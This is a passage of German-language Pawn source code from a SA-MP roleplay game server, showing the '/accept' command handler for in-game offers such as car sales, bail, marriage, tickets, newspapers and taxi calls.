				                		format(kackiyyd, sizeof(kackiyyd), "* Du hast %d Drogen in deinen %s genommen!", strval(x_job),CarName[PlayerCar[carowner][slot][CarModel]-400]);
										SendClientMessage(playerid, COLOR_LIGHTBLUE, kackiyyd);
									}
									else
							   		{
										new kackiyyfh[256];
				                		format(kackiyyfh, sizeof(kackiyyfh), "Du hast nicht genug Drogen in deinen %s!", CarName[PlayerCar[carowner][slot][CarModel]-400]);
										SendClientMessage(playerid, COLOR_GREY, kackiyyfh);
									}
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
					return 1;
				}
			   	return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd,"/accept",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_WHITE, "|__________________ Akzeptieren __________________|");
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: accept [name]");
				SendClientMessage(playerid, COLOR_GREY, "Verfügbare Namen: Sex, Drugs, Repair, Bodyguard, Live, Refill, Wheelmen Kaution");
				SendClientMessage(playerid, COLOR_GREY, "Verfügbare Namen: Car, Taxi, Bus, Boxing, Medic, Mechanic, Paper, Ticket, kippe");
				SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
				return 1;
			}
/*
		   	if(strcmp(x_job,"Orginvite",true) == 0)
		   	{
			   	if(PlayerInfo[playerid][pAngebot] != 18)return SendClientMessage(playerid,COLOR_GREY,"Niemand bietet dir eine Einladung in eine Organisation an.");
			    new org = PlayerInfo[playerid][pMenge];
				new pID = PlayerInfo[playerid][pSeller];
				if(!IsPlayerConnected(pID))return SendClientMessage(playerid,COLOR_GREY,"Spieler nicht eingeloggt.");
				if(!ProxDetectorS(5.0,playerid,pID))return SendClientMessage(playerid,COLOR_GREY,"Der angegebene Spieler ist nicht in deiner Nähe!");
			    format(string,sizeof(string),"Du bist der Organisation '%s' beigetreten.",OrgInfo[org][OrgName]);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Motto:");
				format(string,sizeof(string),"- %s",OrgInfo[org][OrgMotto]);
				SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				format(string,sizeof(string),"%s ist der Organisation '%s' beigetreten.",GetName(playerid),OrgInfo[org][OrgName]);
				SendOrganisationsMessage(org,COLOR_PURPLE,string);
				PlayerInfo[playerid][pOrgMember] = org;
				PlayerInfo[playerid][pSeller] = -1;
				PlayerInfo[playerid][pAngebot] = 0;
				PlayerInfo[playerid][pKaufPreis] = 0;
				PlayerInfo[playerid][pMenge] = 0;
				PlayerInfo[playerid][pVerbrauch] = 0;
			   	return 1;
			}
*/

            if(strcmp(x_job,"rennen",true) == 0)
			{
			    if(RennenHerausforderer[playerid] != INVALID_PLAYER_ID)
			    {
		     		new pid = RennenHerausforderer[playerid];
					SCM(pid,-1,"In 10 Sekunden gehts los, stellt euch auf!");
					SCM(playerid,-1,"In 10 Sekunden gehts los, stellt euch auf!");
					SetTimerEx("RennStart",10000,0,"i",playerid);
        		//	FreezePlayer(pid);
          		//	FreezePlayer(playerid);
				}
				else return SCM(playerid,-1,"Du wurdest von niemandem zum Rennen herausgefordert.");

			            /*
			            format(string, sizeof(string), "* Mechaniker %s hat deinen Auftrag angenommen und ist nun unterwegs zu dir.", GetName(playerid));
						SendClientMessage(pid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Du hast den Auftrag von %s Angenommen, der Spieler wurde auf deiner Karte markiert.", GetName(AnwaltStatus[playerid]),AnwaltPreis[playerid]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						SetPlayerMarkerToPlayer(playerid,pid);*/


			}
     //   RennenHerausforderer[playerid]


            if(strcmp(x_job,"mechaniker",true) == 0)
			{
			    if(!IsMechatronikerLizensiert(playerid)) return SCM(playerid,-1,"Du bist in keiner Organisation / Deine ORG hat keine Mechaniker Lizenz!");
			    if(MechanikerAccept[playerid] < 999)
			    {
			        if(IsPlayerConnected(MechanikerAccept[playerid]))
			        {
			            new pid = MechanikerAccept[playerid];
			            format(string, sizeof(string), "* Mechaniker %s hat deinen Auftrag angenommen und ist nun unterwegs zu dir.", GetName(playerid));
						SendClientMessage(pid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Du hast den Auftrag von %s Angenommen, der Spieler wurde auf deiner Karte markiert.", GetName(AnwaltStatus[playerid]),AnwaltPreis[playerid]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						SetPlayerMarkerToPlayer(playerid,pid);
						MechanikerAccept[pid] = 999;
					}
					else return SCM(playerid,-1,"Niemand benötigt derzeit einen Mechaniker!"); // kein mechatroniker und so
				}
			}
			if(strcmp(x_job,"kaution",true) == 0)
			{
			    if(AnwaltStatus[playerid] < 999)
			    {
			        if(IsPlayerConnected(AnwaltStatus[playerid]))
			        {
							format(string, sizeof(string), "* Du hast %s für %d$ aus dem Knast geholt.", GetName(playerid),AnwaltPreis[playerid]);
							SendClientMessage(AnwaltStatus[playerid], COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Du wurdest von Anwalt %s für %d$ aus dem Knast geholt.", GetName(AnwaltStatus[playerid]),AnwaltPreis[playerid]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							ApprovedLawyer[AnwaltStatus[playerid]] = 0;
							WantLawyer[playerid] = 0;
							CallLawyer[playerid] = 0;
							JailPrice[playerid] = 0;
							PlayerInfo[playerid][pJailTime] = 0;
							PlayerInfo[AnwaltStatus[playerid]][pLawSkill] ++;
							GivePlayerMoneySave(playerid, -AnwaltPreis[playerid]);
							GivePlayerMoneySave(AnwaltStatus[playerid], AnwaltPreis[playerid]);
							if(PlayerInfo[AnwaltStatus[playerid]][pLawSkill] == 50)
							{ SendClientMessage(AnwaltStatus[playerid], COLOR_YELLOW, "* Dein Anwalt Skill ist nun auf 2.Du kannst jetzt schneller und mehr Geld verdienen."); }
							else if(PlayerInfo[AnwaltStatus[playerid]][pLawSkill] == 100)
							{ SendClientMessage(AnwaltStatus[playerid], COLOR_YELLOW, "* Dein Anwalt Skill ist nun auf 3.Du kannst jetzt schneller und mehr Geld verdienen."); }
							else if(PlayerInfo[AnwaltStatus[playerid]][pLawSkill] == 200)
							{ SendClientMessage(AnwaltStatus[playerid], COLOR_YELLOW, "* Dein Anwalt Skill ist nun auf 4.Du kannst jetzt schneller und mehr Geld verdienen."); }
							else if(PlayerInfo[AnwaltStatus[playerid]][pLawSkill] == 400)
							{ SendClientMessage(AnwaltStatus[playerid], COLOR_YELLOW, "* Dein Anwalt Skill ist nun auf 5.Du kannst jetzt schneller und mehr Geld verdienen."); }
                            AnwaltStatus[playerid] = 999;
							return 1;
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Niemand hat dir eine Kaution angeboten !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"car",true) == 0)
			{
			    if(CarStatus[playerid] < 999)
			    {
			        if(IsPlayerConnected(CarStatus[playerid]))
			        {
				        if (ProxDetectorS(5.0, playerid, CarStatus[playerid]))
						{
									if(Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
									{
									SendClientMessage(playerid, COLOR_GREY, "Du hast bereits ein Fahrzeug auf diesen Slot, Verwende /carkey");
									return 1;
									}
								    format(string, 256, "* Du hast das Fahrzeug von %s angenommen, Verwende /carhelp",GetName(CarStatus[playerid]));
								    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								    format(string, 256, "* %s hat dein Fahrzeug akzeptiert!, Du erhälst %d$",GetName(playerid),CarPreisx[playerid]);
								    SendClientMessage(CarStatus[playerid], COLOR_LIGHTBLUE, string);
									GivePlayerMoneySave(CarStatus[playerid], CarPreisx[playerid]);
									GivePlayerMoneySave(playerid, -CarPreisx[playerid]);
									OnPlayerCarUpdate(CarStatus[playerid],false);
									DestroyVehicle(PlayerCar[CarStatus[playerid]][Dtc_PlayerKey[CarStatus[playerid]]][CarId]);// Zerstört das Fahrzeug vom Verkäufer
									CarDarfKeyNetChangen[CarStatus[playerid]] = 0;
								    new string2[128];
									new playername2[MAX_PLAYER_NAME];
								    GetPlayerName(playerid, playername2, sizeof(playername2));
									format(string2, sizeof(string2), "/Autos/%s%d.ini", GetName(CarStatus[playerid]),Dtc_PlayerKey[CarStatus[playerid]]);
									new File: UserFile = fopen(string2, io_read);
									if (UserFile)
									{
									    Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]] = 1;
										new key[ 256 ] , val[ 256 ];
										new Data[ 256 ];
										while ( fread( UserFile , Data , sizeof( Data ) ) )
										{
											key = ini_GetKey( Data );
											if( strcmp( key , "CarId" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId] = strval( val ); }
										   	if( strcmp( key , "CarModel" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel] = strval( val ); }
										   	if( strcmp( key , "CarPos_x" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_x] = floatstr( val ); }
											if( strcmp( key , "CarPos_y" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_y] = floatstr( val ); }
											if( strcmp( key , "CarPos_z" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_z] = floatstr( val ); }
											if( strcmp( key , "CarRotate" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRotate] = floatstr( val ); }
											if( strcmp( key , "CarNitro" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarNitro] = strval( val ); }
											if( strcmp( key , "CarHyd" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarHyd] = strval( val ); }
											if( strcmp( key , "Kilometer" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][Kilometer] = strval( val ); }
											if( strcmp( key , "Benzin" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][Benzin] = strval( val ); }
											if( strcmp( key , "CarWheel" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarWheel] = strval( val ); }
											if( strcmp( key , "CarAusp" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarAusp] = strval( val ); }
											if( strcmp( key , "CarSideL" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarSideL] = strval( val ); }
											if( strcmp( key , "CarSideR" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarSideR] = strval( val ); }
											if( strcmp( key , "CarFB" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarFB] = strval( val ); }
											if( strcmp( key , "CarRB" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRB] = strval( val ); }
											if( strcmp( key , "CarSpoiler" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarSpoiler] = strval( val ); }
											if( strcmp( key , "CarRoof" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRoof] = strval( val ); }
											if( strcmp( key , "CarHood" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarHood] = strval( val ); }
											if( strcmp( key , "CarVents" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarVents] = strval( val ); }
										 	if( strcmp( key , "CarLamps" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarLamps] = strval( val ); }
											if( strcmp( key , "CarPJ" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPJ] = strval( val ); }
											if( strcmp( key , "CarC1" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarC1] = strval( val ); }
											if( strcmp( key , "CarC2" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarC2] = strval( val ); }
											if( strcmp( key , "Preis" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPreis] = strval( val ); }
											if( strcmp( key , "Plate" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][Plate] = strval( val ); }
											if( strcmp( key , "Neon" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][Neon] = strval( val ); }
											if( strcmp( key , "Abgeschleppt" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][Abgeschleppt] = strval( val ); }
											if( strcmp( key , "LPG" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][LPG] = strval( val ); }
											if( strcmp( key , "CarGivekey" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarGivekey] = strval( val ); }
										}
								        fclose(UserFile);
								        PlayerCarSpawn(playerid,Dtc_PlayerKey[playerid]);
							}
					 	    new string3[128];
							format(string3, sizeof(string3), "/Autos/%s%d.ini", GetName(CarStatus[playerid]),Dtc_PlayerKey[CarStatus[playerid]]);
							fremove(string3);
							Dtc_PlayerHaveCar[CarStatus[playerid]][Dtc_PlayerKey[CarStatus[playerid]]] = 0;// Entfernt den Verkäufer das Fahrzeug
                            CarStatus[playerid] = 999;
							VehVerkauf[CarStatus[playerid]] = 0;
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe !");
							return 1;
						}
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Niemand hat dir ein Fahrzeug angeboten!");
				    return 1;
				}
			}
			else if(strcmp(x_job,"stats",true) == 0)
			{
			    if(StatsStatus[playerid] < 999)
			    {
			        if(IsPlayerConnected(StatsStatus[playerid]))
			        {
				        if (ProxDetectorS(5.0, playerid, StatsStatus[playerid]))
						{
						    new pname[256];
						    GetPlayerName(playerid, pname, 256);
						    format(string, 256, "** %s Sieht sich deine Statistiken an **",pname);
						    SendClientMessage(StatsStatus[playerid], COLOR_LIGHTBLUE, string);
	                        Stats(playerid,StatsStatus[playerid]);
                            StatsStatus[playerid] = 999;
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe !");
							return 1;
						}
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Keiner hat dir Stats angeboten !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"paket",true) == 0)
			{
			    if(PaketStatus[playerid] < 999)
			    {
			        if(IsPlayerConnected(PaketStatus[playerid]))
			        {
				        if (ProxDetectorS(5.0, playerid, PaketStatus[playerid]))
						{
						    new pname[256];
						    GetPlayerName(playerid, pname, 256);
						    format(string, 256, "** Spieler %s hat ein Erstehilfe Paket gekauft! 500$ **",pname);
						    SendClientMessage(PaketStatus[playerid], COLOR_LIGHTBLUE, string);
						    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast ein Erste-Hilfe paket gekauft! nutze es mit /erstehilfe.");
                            GivePlayerMoneySave(playerid, -500);
                            GivePlayerMoneySave(PaketStatus[playerid], 500);
		                    PaketStatus[playerid] = 999;
                            PlayerInfo[playerid][pErstehilfe] = 1;
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Kein Sanitäter in deiner nähe !");
							return 1;
						}
					}
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dir wurde kein Paket angeboten !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"scheidung",true) == 0)
			{
			    if(DivorceOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(DivorceOffer[playerid]))
			        {
			            if(ProxDetectorS(10.0, playerid, DivorceOffer[playerid]))
						{
						    GetPlayerName(DivorceOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* * Du hast den Scheidung von %s angenommen.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s hat die Scheidung akzeptiert.", sendername);
							SendClientMessage(DivorceOffer[playerid], COLOR_LIGHTBLUE, string);
							ClearMarriage(playerid);
							ClearMarriage(DivorceOffer[playerid]);
							PlayerInfo[playerid][pHouseKey] = 999;
							PlayerInfo[playerid][pPbiskey] = 255;
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe! !");
						    return 1;
						}
			        }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Keiner hat die Scheidung eingereicht!");
				    return 1;
				}
			}
			else if(strcmp(x_job,"kippe",true) == 0)
			{
			    if(ZigOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(ZigOffer[playerid]))
			        {
			        	if(PlayerInfo[ZigOffer[playerid]][pZig] >= 1)
			        	{
				            if(ProxDetectorS(10.0, playerid, ZigOffer[playerid]))
							{
							    GetPlayerName(ZigOffer[playerid], giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* * Du hast die Zigarette von %s angenommen.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat die Zigarette angenommen.", sendername);
								SendClientMessage(ZigOffer[playerid], COLOR_LIGHTBLUE, string);
								PlayerInfo[ZigOffer[playerid]][pZig] -= 1;
								PlayerInfo[playerid][pZig] += 1;
	 							return 1;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe! ");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Du hast keine Zigaretten mehr!");
						    return 1;
						}
			        }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Keiner hat dir eine Kippe angeboten!");
				    return 1;
				}
			}
            else if(strcmp(x_job,"heirat",true) == 0)
            {
                if(ProposeOffer[playerid] < 999)
                {
                    if(IsPlayerConnected(ProposeOffer[playerid]))
                    {
                        if(ProxDetectorS(10.0, playerid, ProposeOffer[playerid]))
                        {
                                    GetPlayerName(ProposeOffer[playerid], giveplayer, sizeof(giveplayer));
                                    GetPlayerName(playerid, sendername, sizeof(sendername));
                                    format(string, sizeof(string), "* %s hat den Antrag angenommen.", giveplayer);
                                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                    format(string, sizeof(string), "* %s hat den Antrag angenommen.", sendername);
                                    SendClientMessage(ProposeOffer[playerid], COLOR_LIGHTBLUE, string);
                                    format(string, sizeof(string), "{ff8200} %s und %s sind nun verheiratet!", giveplayer,sendername);
                                    SendClientMessageToAll(TEAM_BALLAS_COLOR, string);
								    GivePlayerMoneySave(playerid, - 15000);
                                    ProposedTo[ProposeOffer[playerid]] = playerid;
                                    GotProposedBy[playerid] = ProposeOffer[playerid];
                                    ProposeOffer[playerid] = 999;
				                	format(string, sizeof(string), "%s", sendername);
			                		strmid(PlayerInfo[ProposeOffer[playerid]][pMarriedTo], string, 0, strlen(string), 255);
			                  		format(string, sizeof(string), "%s", giveplayer);
			                  		strmid(PlayerInfo[playerid][pMarriedTo], string, 0, strlen(string), 255);
                				    PlayerInfo[playerid][pMarried] = 1;
						            return 1;
                                }
                                else
                                {
                                    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe!");
                                    return 1;
                                }
                            }
                            return 1;
                        }
                        else
                      {
                      SendClientMessage(playerid, COLOR_GREY, "  Niemand hat dir einen Antrag gestellt!");
                      return 1;
                      }
            }
			else if(strcmp(x_job,"ticket",true) == 0)
			{
			    if(TicketOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(TicketOffer[playerid]))
			        {
			            if (ProxDetectorS(5.0, playerid, TicketOffer[playerid]))
						{
	         		        if(GetPlayerMoneySave(playerid) < TicketMoney[playerid])
	                        {
	                            SendClientMessage(playerid, COLOR_GREY, "Du hast nicht genug Geld !");
	                            SendClientMessage(TicketOffer[playerid], COLOR_GREY, "Der Spieler hat nicht genug Geld um das Ticket zu bezahlen!");
	                            return 1;
	                        }
				           	GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "* Du hast %d$ für das Ticket von %s bezahlt!", TicketMoney[playerid], giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s hat dir %d$ für das Ticket bezahlt!", sendername, TicketMoney[playerid]);
							SendClientMessage(TicketOffer[playerid], COLOR_LIGHTBLUE, string);
							GivePlayerMoneySave(playerid, - TicketMoney[playerid]);
							GivePlayerMoneySave(TicketOffer[playerid], TicketMoney[playerid]);
							WantedLevel[playerid] = 0;
							TicketOffer[playerid] = 999;
							TicketMoney[playerid] = 0;
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Polizeibeamte ist nicht in deiner Nähe !");
						    return 1;
						}
			        }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Keiner hat dir ein Ticket gegeben !");
				    return 1;
				}
			}
			else if(strcmp(x_job,"paper",true) == 0)
			{
			    if(PaperOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(PaperOffer[playerid]))
			        {
			            if(BringingPaper[PaperOffer[playerid]] > 0)
			            {
			                if (ProxDetectorS(5.0, playerid, PaperOffer[playerid]))
							{
				            	GetPlayerName(PaperOffer[playerid], giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
								format(string, sizeof(string), "* Du hast die Zeitung vom Boten %s angenommen(Tipp /read paper).", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat dir die Zeitung abgekauft.", sendername);
								SendClientMessage(PaperOffer[playerid], COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pTitle]);
								strmid(Paper[playerid][pTitle], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pMaker]);
								strmid(Paper[playerid][pMaker], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine1]);
								strmid(Paper[playerid][pLine1], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine2]);
								strmid(Paper[playerid][pLine2], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine3]);
								strmid(Paper[playerid][pLine3], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine4]);
								strmid(Paper[playerid][pLine4], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine5]);
								strmid(Paper[playerid][pLine5], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine6]);
								strmid(Paper[playerid][pLine6], string, 0, strlen(string), 255);
								format(string, sizeof(string), "%s", Paper[PaperOffer[playerid]][pLine7]);
								strmid(Paper[playerid][pLine7], string, 0, strlen(string), 255);
								GotPaper[playerid] = 1;
								PaperOffer[playerid] = 999;
								return 1;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Kein Zeitungsjunge in der Nähe !");
							    return 1;
							}
						}
			        }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Keiner hat dir eine Zeitung angeboten!");
				    return 1;
				}
			}
/*
			else if(strcmp(x_job,"boxing",true) == 0)
			{
			    if(BoxOffer[playerid] < 999)
			    {
			        if(IsPlayerConnected(BoxOffer[playerid]))
			        {
			            new points;
			            new mypoints;
			            GetPlayerName(BoxOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
			            new level = PlayerInfo[BoxOffer[playerid]][pBoxSkill];
						if(level >= 0 && level <= 50) { points = 40; }
						else if(level >= 51 && level <= 100) { points = 50; }
						else if(level >= 101 && level <= 200) { points = 60; }
						else if(level >= 201 && level <= 400) { points = 70; }
						else if(level >= 401) { points = 80; }
						if(PlayerInfo[playerid][pJob] == 12)
						{
							new clevel = PlayerInfo[playerid][pBoxSkill];
							if(clevel >= 0 && clevel <= 50) { mypoints = 40; }
							else if(clevel >= 51 && clevel <= 100) { mypoints = 50; }
							else if(clevel >= 101 && clevel <= 200) { mypoints = 60; }
							else if(clevel >= 201 && clevel <= 400) { mypoints = 70; }
							else if(clevel >= 401) { mypoints = 80; }
						}
						else
						{
						    mypoints = 30;
						}
						format(string, sizeof(string), "* Du hast die Herausforderung von %s angenommen, du kämpfst mit %d HP.",giveplayer,mypoints);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s hat deine Herausforderung angenommen, du kämpfst mit %d HP.",sendername,points);
						SendClientMessage(BoxOffer[playerid], COLOR_LIGHTBLUE, string);
						SetPlayerHealth(playerid, mypoints);
						SetPlayerHealth(BoxOffer[playerid], points);
						SetPlayerInterior(playerid, 5); SetPlayerInterior(BoxOffer[playerid], 5);
						SetPlayerPos(playerid, 762.9852,2.4439,1001.5942); SetPlayerFacingAngle(playerid, 131.8632);
						SetPlayerPos(BoxOffer[playerid], 758.7064,-1.8038,1001.5942); SetPlayerFacingAngle(BoxOffer[playerid], 313.1165);
						FreezePlayer(playerid);
						FreezePlayer(BoxOffer[playerid]);
						GameTextForPlayer(playerid, "~r~Waiting", 3000, 1); GameTextForPlayer(BoxOffer[playerid], "~r~Warte", 3000, 1);
						new name[MAX_PLAYER_NAME];
						new dstring[MAX_PLAYER_NAME];
						new wstring[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						format(dstring, sizeof(dstring), "%s", name);
						strmid(wstring, dstring, 0, strlen(dstring), 255);
						if(strcmp(Titel[TitelName] ,wstring, true ) == 0 )
						{
						    format(string, sizeof(string), "Box News: Champion %s wird in 60sek gegen %s antreten, (Grove Gym).",  sendername, giveplayer);
							OOCOff(COLOR_WHITE,string);
							TBoxer = playerid;
							BoxDelay = 60;
						}
						GetPlayerName(BoxOffer[playerid], name, sizeof(name));
						format(dstring, sizeof(dstring), "%s", name);
						strmid(wstring, dstring, 0, strlen(dstring), 255);
						if(strcmp(Titel[TitelName] ,wstring, true ) == 0 )
						{
						    format(string, sizeof(string), "Box News: Champion %s wird in 60sek gegen %s antreten, (Grove Gym).",  giveplayer, sendername);
							OOCOff(COLOR_WHITE,string);
							TBoxer = BoxOffer[playerid];
							BoxDelay = 60;
						}
						BoxWaitTime[playerid] = 1; BoxWaitTime[BoxOffer[playerid]] = 1;
						if(BoxDelay < 1) { BoxDelay = 20; }
						InRing = 1;
						Boxer1 = BoxOffer[playerid];
						Boxer2 = playerid;
						PlayerBoxing[playerid] = 1;
						PlayerBoxing[BoxOffer[playerid]] = 1;
						BoxOffer[playerid] = 999;
						return 1;
			        }
			        return 1;
			    }
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Kein Box Wetkampf !");
				    return 1;
				}
			}
*/
			else if(strcmp(x_job,"taxi",true) == 0)
			{
			    if(TransportDuty[playerid] != 1)
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Taxi Fahrer !");
				    return 1;
			    }
	            if(TaxiCallTime[playerid] > 0)
	            {
	                SendClientMessage(playerid, COLOR_GREY, "   Du hast bereits ein Taxi gerufen !");
				    return 1;
	            }
	            if(TaxiCall < 999)
	            {
	                if(IsPlayerConnected(TaxiCall))
	                {
	                    GetPlayerName(playerid, sendername, sizeof(sendername));
	                	GetPlayerName(TaxiCall, giveplayer, sizeof(giveplayer));
	                	format(string, sizeof(string), "* Du hast den Auftrag von %s angenommen, fahre zu dem Marker auf der MiniMap.",giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* Taxi Fahrer %s ist unterwegs zu dir, Bitte warte an deiner momentanen Position.",sendername);
						SendClientMessage(TaxiCall, COLOR_LIGHTBLUE, string);
						GameTextForPlayer(playerid, "~w~Taxi Fahrer~n~~r~Goto Redmarker", 5000, 1);
						TaxiCallTime[playerid] = 1;
						TaxiAccepted[playerid] = TaxiCall;
						TaxiCall = 999;
						return 1;
					}
	            }
	            else
	            {
